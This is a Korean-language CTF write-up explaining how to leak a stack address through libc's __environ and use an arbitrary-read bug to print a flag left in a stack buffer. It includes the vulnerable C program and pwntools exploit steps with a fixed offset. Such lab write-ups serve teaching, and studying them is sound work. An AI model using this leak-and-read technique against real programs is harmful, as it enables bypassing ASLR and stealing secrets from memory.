# _environ (`__environ`으로 스택 주소 릭)

임의 주소 **읽기**만 가능한 상황에서, libc의 `__environ` 전역이 **스택 주소를 담고 있다는 점**을 이용해 스택에 있는 flag 버퍼를 읽어낸다.

## 대상 코드

```c
void read_file() {
  char file_buf[4096];
  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);   // flag를 스택 버퍼에 로드 후 함수 종료
  close(fd);
}
int main() {
  char buf[1024]; long addr; int idx;
  read_file();
  printf("stdout: %p\n", stdout);              // libc 릭 제공
  while (1) {
    scanf("%d", &idx);
    if (idx == 1) {
      scanf("%ld", &addr);
      printf("%s", (char *)addr);              // 임의 주소 읽기(AAR)
    }
  }
}
```

- `%s`로 **임의 주소의 문자열을 출력**한다 → AAR primitive.
- flag는 `read_file`의 지역 버퍼(`file_buf`)에 로드된다. 함수가 끝나도 스택에는 값이 남아 있다.
- 문제는 **그 스택 주소를 모른다**는 것(ASLR).

## `__environ` 이란

libc 전역 `__environ`은 프로세스의 환경변수 배열 `envp`를 가리키며, 이 값은 **스택 최상단 근처의 주소**다. 즉 `__environ`을 읽으면 **현재 스택의 실제 주소**를 얻을 수 있다.

## 익스플로잇 원리

### 1단계 — libc base
`stdout` 주소를 알려주므로:
```python
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
libc_environ = libc_base + libc.symbols['__environ']
```

### 2단계 — 스택 주소 릭
AAR로 `__environ`을 읽어 스택 주소 획득:
```python
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(libc_environ).encode())
stack_environ = u64(p.recv(6) + b'\x00'*2)
```

### 3단계 — flag 버퍼 계산 후 읽기
`envp`와 `file_buf`의 스택상 거리(고정 오프셋 `0x1568`)를 빼서 flag 주소를 구하고 다시 AAR:
```python
file_content = stack_environ - 0x1568
p.sendlineafter(b'>', b'1')
p.sendlineafter(b':', str(file_content).encode())   # flag 출력
```

## 핵심 개념

- **`__environ` = 스택 릭 도구**: libc 주소를 아는 상태에서 스택 ASLR을 우회하는 대표 기법.
- 오프셋(`0x1568`)은 같은 바이너리/실행 환경에서 **스택 프레임 배치가 고정**이기에 성립. 디버거로 `file_buf`와 `environ`의 거리를 한 번 측정해 얻는다.
- AAR만으로 코드 실행 없이 flag를 직접 유출한 사례.
